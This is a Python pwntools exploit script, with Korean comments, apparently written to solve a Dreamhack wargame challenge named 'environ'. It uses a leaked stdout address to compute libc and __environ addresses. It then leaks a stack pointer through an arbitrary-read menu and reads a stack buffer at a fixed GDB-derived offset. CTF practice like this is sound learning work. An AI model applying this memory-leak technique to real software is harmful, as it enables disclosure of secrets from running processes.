#!/usr/bin/env python3
# Name: environ.py
from pwn import *

#p = process('./environ')
p = remote("host3.dreamhack.games", "11253")
# elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./libc.so.6')

# GDB를 통해 확인한 정보
OFFSET_FROM_ENVIRON_TO_BUFFER = 0x1538

p.recvuntil(b'stdout: ')
stdout = int(p.recvuntil(b'\n'), 16)  # stdout 주소 획득(편의를 위해 예시에서 제공)
libc_base = stdout - elf.symbols['_IO_2_1_stdout_']  # libc_base 주소 계산
libc_environ = libc_base + elf.symbols['__environ']  # __environ 변수 주소 계산
print('libc_base:', hex(libc_base))
print('libc_environ:', hex(libc_environ))

# 임의 주소 읽기를 위한 값 입력
p.sendlineafter(b'> ', b'1')
print('encoded libc_environ:', str(libc_environ).encode())
p.sendlineafter(b'Addr: ', str(libc_environ).encode())  # __environ 변수가 가리키는 값 출력 유도

stack_environ = p.recv(6)
print('raw stack_environ:', stack_environ)
stack_environ = u64(stack_environ.ljust(8, b'\x00'))  # printf("%s", (char *)addr); 에서 전달된 값 파싱
# stack_environ 은 __environ 변수가 가리키는 stack 의 주소
print('stack_environ:', hex(stack_environ))

file_content = stack_environ - OFFSET_FROM_ENVIRON_TO_BUFFER  # 데이터가 저장된 stack 주소 계산
print('file_content:', hex(file_content))
# 임의 주소 읽기를 위한 값 입력
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b':', str(file_content).encode())  # printf("%s", (char *)addr); 에서 전달된 값 파싱

p.interactive()
